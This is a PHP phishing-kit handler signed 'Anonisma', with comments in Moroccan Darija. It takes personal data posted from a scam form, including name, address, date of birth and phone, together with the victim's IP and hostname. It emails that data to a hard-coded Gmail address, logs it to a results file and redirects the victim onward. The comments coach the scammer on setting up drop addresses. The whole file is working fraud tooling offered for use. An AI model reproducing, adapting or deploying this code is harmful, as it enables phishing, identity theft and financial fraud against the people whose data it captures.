<?php

//Anonisma ...

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------+|----------------------------|+--------------|\n";
$message .= "|----------+|Scam vPriv8 By Anonisma A/D/R/S |+--------------|\n"; // Chof awld na3ja scama mat3tehach b vs sma3tini ? la wach sma3tini wla la ? ah s7abni, wa hakak lah yarde 3lik awldi lah ynaj7ak
$message .= "|----------+|----------------------------|+--------------|\n";
$message .= "|FRSNM     : ".$_POST['Anonisma1']."\n";
$message .= "|LSTNM     : ".$_POST['Anonisma2']."\n";
$message .= "|ADD1      : ".$_POST['Anonisma3']."\n";
$message .= "|ADD2      : ".$_POST['Anonisma4']."\n";
$message .= "|CITY      : ".$_POST['Anonisma5']."\n";
$message .= "|ZIP       : ".$_POST['Anonisma6']."\n";
$message .= "|STAT      : ".$_POST['Anonisma7']."\n";
$message .= "|DAT       : ".$_POST['Anonisma8']." / ".$_POST['Anonisma9']." / ".$_POST['Anonisma10']."\n";
$message .= "|FON       : ".$_POST['Anonisma11']."\n";
$message .= "|CNTRY     : ".$_POST['Anonisma12']."\n";
$message .= "|----------+|--------------------------|+--------------|\n";
$message .= "|----------+|Informacón de la víctima .|+--------------|\n";  // chof ! sma3 ! tbon mok kaykhl3 !... azaml ila laghamtiha machi rajl wald na3ja .
$message .= "|----------+|--------------------------|+--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|Scam vPriv8  by Anonisma|--------------|\n";
$send = "yazidanjar@Gmail.com  , ";   // <=== Dir 2 email wa7d Hotmail o wa7d Yahou wla Gmail , dir 2 ach khsarti bach ta yla waslat khawya fwa7d fflakhor yji 3amra                                               
$subject = "~ vPriv8 Nuevos Resultados Anonisma /ADRS/~| $ip";

mail("$send", "$subject", $message);   

$f = fopen("./resultados.txt", "a");  // ila waslat chi haja khawya dkhol : ./email/resultados.txt ===> tal9a result maktouba
fwrite($f, $message);

?>

<html>
<script language="javascript">
var page = "../reparacions.php?"          
top.location = page;
</script> 
</html>